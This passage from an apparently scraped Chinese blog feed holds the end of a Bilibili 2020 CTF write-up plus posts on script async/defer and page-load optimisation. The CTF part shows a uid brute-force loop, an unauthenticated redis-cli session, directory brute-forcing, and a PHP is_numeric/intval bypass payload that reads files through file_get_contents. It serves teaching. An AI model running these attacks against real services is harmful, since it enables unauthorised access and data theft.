class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\"> <div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-25</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 <code>document.write</code>），因此 User Agent 在遇到该脚本时不应该暂停解析和渲染 document。</p>\n</blockquote>\n<p>值得注意的是，在 HTML4.01 规范中没有强制浏览器用什么行为面对 <code>defer</code> 属性，各个浏览器的实现导致了千奇百怪的行为，这里仅简单列举几个 Quirk 行为：</p>\n<ul>\n<li>2001 年发布的 IE 6 开始对 <code>defer</code> 属性提供支持，但是直到 11 年后 IE 10 发布之前，IE 都不能保证带有 <code>defer</code> 属性的 <code>&lt;script&gt;</code> 能够按顺序执行：如果第一个 <code>defer</code> 的 <code>&lt;script&gt;</code> 使用 DOM API 修改了 DOM 结构、那么第二个 <code>&lt;script defer&gt;</code> 会在第一个 <code>&lt;script&gt;</code> 执行完毕之前就会开始执行。</li>\n<li>2009 年发布的 Firefox 3.5 开始对 <code>defer</code> 属性提供支持，<a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=688580\">但是带有 <code>defer</code> 的 <code>&lt;script&gt;</code> 可能会在 <code>DOMContentLoaded</code> 之后加载和执行</a>，而且 Firefox 甚至会异步执行带有 <code>defer</code> 属性的内联脚本。这一行为直到五年后在 Firefox 31 中才被修复。</li>\n<li>2010 年的 Chrome 8 开始实现 <code>defer</code> 属性。但如果页面的 MIME Type 为 XHTML（<code>application/xhtml+xml</code>），那么 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=874749\">Chrome 会无视 <code>&lt;script&gt;</code> 的 <code>defer</code> 属性</a>，因为 <a href=\"https://bugs.chromium.org/p/chromium/issues/detail?id=611136\">在 XHTML 中 <code>defer</code> 属性只是一个可选实现</a>。</li>\n</ul>\n<p>终于在 HTML5 中，不仅 <code>defer</code> 应有的行为被正式确定下来，而且还介绍了一个新的属性 <code>async</code>，提供了「真正异步地」加载和执行外部脚本的方式。也正是因为 HTML5 正式发布，下面这张介绍 <code>defer</code> 和 <code>async</code> 区别的图也开始深入人心：</p>\n<blockquote><p>这张出现在绝大部分文章中的图，正是来自 HTML5 规范：<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async\">https://html.spec.whatwg.org/multipage/scripting.html#attr-script-async</a></p></blockquote>\n<p>IE 10、Chrome 8、Firefox 3.6 都对 <code>async</code> 属性提供了支持。相对于 <code>defer</code> 混乱的实现，浏览器对 <code>async</code> 的实现可谓是乖巧了许多：除 Safari 5.0 会无视 <code>async</code> 的取值外（<code>async=false</code> 时仍然会异步地加载和执行该外部脚本。这一 Bug 在 Safari 5.1 即被修复），绝大部分浏览器的实现都很正常。</p>\n<h2>等等，动态插入的 script 标签呢</h2>\n<p>如果你还记得 Google 给出的第一种 <code>analytics.js</code> 的加载方法的话（什么？你不记得了？快回到第一节再看一遍），你会注意到 Google 为了「保证了脚本在所有浏览器上都会异步地加载和执行」，使用了 <code>document.createElement('script')</code> 和 <code>el.parentNode.insertBefore</code> 动态插入 <code>&lt;script&gt;</code> 标签。这就引出了这一节的内容：动态插入的 <code>&lt;script&gt;</code> 应该按照什么顺序加载和执行呢？</p>\n<p>这个问题在 HTML4.01 的规范中完全没有说明，因此 HTML5 发布之前，当时的浏览器也依然采用了自己的实现：</p>\n<ul>\n<li>对于 WebKit、Blink 和 IE，动态插入的脚本将会被默认视为需要被异步加载和执行的脚本。如果要同步执行，需要显式声明 <code>async = false</code>。</li>\n<li>对于 Presto（早期 Opera 使用的自研内核）和 Firefox &lt;= 4，动态插入的脚本会默认同步加载和执行，除非显示声明 <code>async = true</code>。不过从 Firefox 4.0 开始，动态插入的脚本将会异步加载和执行，以和 IE、WebKit 行为保持一致（因此同步执行也一样需要显式声明 <code>async = false</code> ）；当 Opera 15 开始更换为基于 Chormium 开发（当时 Chromium 版本为 28）后，行为也变得和 IE、WebKit 一致。</li>\n</ul>\n<p>在 HTML5 规范中，这一问题终于被一劳永逸的解决了。在「<a href=\"https://html.spec.whatwg.org/multipage/scripting.html#script-processing-model\">HTML Standard - 4.12.1.1 Processing Model</a>」中明确规定了浏览器应该如何处理动态插入的 <code>&lt;script&gt;</code>。对于传统的脚本（非 Module），大致处理流程如下所示：</p>\n<blockquote><p>本图由 Sukka 绘制，按照 CC BY-NC-SA 4.0 协议共享。使用时请遵守许可协议，注明出处、不得被用于商业用途（除非获得书面许可）。</p></blockquote>\n<h2>尾声</h2>\n<p>Google Analytics 在 2013 年开始逐渐用 <code>analytics.js</code> 代替 <code>ga.js</code> 时，市面上同时存在有现代的支持 HTML5 和 <code>async</code> 属性的浏览器、和不支持 <code>async</code> 属性的「前 HTML5 时代的」古董浏览器。如果要保证在所有的浏览器上 Google Analytics 都能被异步地加载和执行，动态地将 <code>&lt;script&gt;</code> 标签插入 DOM 中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a 